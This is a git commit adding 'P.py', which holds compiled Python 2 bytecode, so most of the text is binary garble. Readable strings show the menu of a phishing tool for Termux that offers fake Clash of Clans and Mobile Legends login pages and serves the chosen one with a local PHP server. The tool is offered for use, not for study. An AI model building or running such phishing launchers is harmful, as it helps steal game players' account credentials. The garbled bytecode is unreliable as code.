fe2436d91a8f96bb8449c79b73af6847c9fe335b
Mr_XiD <44462886+safri1234@users.noreply.github.com>
2018-12-21 06:00:40 +0700

    Create P.py

---
+++ P.py
@@ -0,0 +1,42 @@
+ó
+t<²Zc@s‰ddlZddlZddlZddlZdZdZdZdZ
+dZd
+Z	e	de	d	e	d
+e	d
+fZ
+ej
+e
+ƒZ
+ej
+e
+ƒZ
+ejd
+ƒd
+GHe
+dGHe
+dGHe
+dGHe
+dGHe
+dedGHededGHededGHe
+dGHe
+dede
+dGHdedGHdedGHded GHe
+dede
+dGHed!e
+d"ed#ƒZed$ksœed%krÓyejd&ƒWq…ek
+rÏd'GHejƒq…Xn²ed(ksëed)kr"yejd*ƒWq…ek
+rd'GHejƒq…Xnced+ks:ed,krfd-GHejDEDE SEORANG JOMBLO  s[!]s###########################s	[93m[1] sPhising Clash Of Clans    [1]s	[93m[2] sPhising Mobile Legends    [2]s	[93m[3] sEXIT                      [3]s
+s	[Phising sNo]: t01t1sphp -S 127.0.0.1:8080 -t 1s Cek Lagi File Nyat02t2sphp -S 127.0.0.1:8080 -t 2t03t3s
+KELUAR (THANK YOU MASTER)is)
+[!] Pilih Umpan Nya Yang Bener Donk Bebzispython2 phising.py(tostrandomtsysttimetBtDtKtHtPtxtacaktchoicetRtStsystemt	raw_inputtfisht
+ImportErrortexittsleep(((s3/data/data/com.termux/files/home/Phising/phising.pyt<module>sb
+
+
+
+"
+						
+
+
+
+
+
